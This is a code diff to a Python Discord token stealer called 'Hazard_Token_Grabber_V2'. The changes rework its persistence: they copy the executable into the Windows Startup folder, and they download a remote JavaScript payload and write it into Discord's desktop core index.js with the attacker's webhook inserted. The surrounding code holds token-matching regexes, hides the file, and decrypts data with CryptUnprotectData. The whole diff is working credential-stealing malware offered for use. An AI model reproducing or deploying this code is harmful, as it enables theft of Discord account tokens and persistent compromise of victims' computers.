@@ -17,6 +17,8 @@ from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
+from time import sleep
+
 config = {
     # replace WEBHOOK_HERE with your webhook
     'webhook': "WEBHOOK_HERE",
@@ -76,6 +78,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.temp = os.getenv("temp")
+        self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         self.dir = self.temp+"\\Hazard_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
@@ -144,10 +147,8 @@ class Hazard_Token_Grabber_V2(functions):
         ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
 
     def startup(self):
-        _file = self.roaming + \
-            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         try:
-            shutil.copy2(argv[0], _file)
+            shutil.copy2(argv[0], self.startup)
         except Exception:
             pass
 
@@ -160,17 +161,16 @@ class Hazard_Token_Grabber_V2(functions):
                     if match(r'app-(\d*\.\d*)*', __dir):
                         app = os.path.abspath(disc_sep+__dir)
                         inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\'
-                        try:
-                            os.makedirs(inj_path+'initiation', exist_ok=True)
-                        except (FileExistsError,PermissionError):
-                            pass
-                        finally:
-                            if os.path.exists(inj_path):
-                                f = httpx.get(self.config('injection_url')).text.replace(
-                                    "%WEBHOOK%", self.webhook)
-                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
-                                    indexFile.write(f)
-                                os.startfile(app + self.sep + _dir + '.exe')
+                        if os.path.exists(inj_path):
+                            if self.startup not in argv[0]:
+                                try:
+                                    os.makedirs(inj_path+'initiation', exist_ok=True)
+                                except (FileExistsError, PermissionError):
+                                    pass
+                            f = httpx.get(self.config('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                indexFile.write(f)
+                            os.startfile(app + self.sep + _dir + '.exe')
 
     def killDiscord(self):
         for proc in psutil.process_iter():
@@ -534,3 +534,4 @@ class Hazard_Token_Grabber_V2(functions):
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Hazard_Token_Grabber_V2().init())
+    sleep(6)
